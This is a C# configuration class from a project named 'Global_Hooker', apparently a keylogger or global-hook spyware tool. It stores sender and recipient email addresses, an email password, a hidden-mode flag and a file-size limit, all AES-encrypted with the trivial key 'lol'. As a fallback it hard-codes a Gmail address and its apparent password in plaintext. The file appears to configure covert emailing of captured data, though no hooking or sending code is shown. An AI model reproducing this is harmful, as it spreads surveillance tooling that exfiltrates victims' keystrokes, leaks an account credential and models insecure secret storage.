using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using GodSharp.Encryption;

namespace Global_Hooker
{
    class ConfigurationManager
    {
        public string EmailAddresser { get; set; }
        public string EmailAddressee { get; set; }
        public string EmailPassword { get; set; }
        public string HiddenMode { get; set; }
        public int MaxFileSize { get; set; }

        private static ConfigurationManager _instace;

        public static ConfigurationManager Instance
        {
            get
            {
                if (_instace == null)
                    _instace = new ConfigurationManager();
                return _instace;
            }
        }

        private ConfigurationManager()
        {
            try
            {
                EmailAddressee = AES.Decrypt(Properties.Settings.Default.EmailAddressee, "lol");
                EmailAddresser = AES.Decrypt(Properties.Settings.Default.EmailAddresser, "lol");
                EmailPassword = AES.Decrypt(Properties.Settings.Default.EmailPassword, "lol");
                HiddenMode = AES.Decrypt(Properties.Settings.Default.HiddenMode, "lol");
                MaxFileSize = int.Parse(AES.Decrypt(Properties.Settings.Default.MaxFileSize, "lol"));
                if (MaxFileSize <= 0)
                {
                    MaxFileSize = 1000;
                }
            }
            catch (Exception ex)
            {
                EmailAddressee = "lol@gmail.com";
                EmailAddresser = "evgenuypetrushevskiv8@gmail.com";
                EmailPassword = "824657595153/EPv8";
                HiddenMode = "False";
                MaxFileSize = 1000;
            }
        }

        public void SaveConfig()
        {
            var settings = Properties.Settings.Default;
            settings.EmailAddressee = AES.Encrypt(EmailAddressee, "lol");
            settings.EmailAddresser = AES.Encrypt(EmailAddresser, "lol");
            settings.EmailPassword = AES.Encrypt(EmailPassword, "lol");
            settings.HiddenMode = AES.Encrypt(HiddenMode, "lol");
            settings.MaxFileSize = AES.Encrypt(MaxFileSize.ToString(), "lol");
            settings.Save();
        }
    }
}
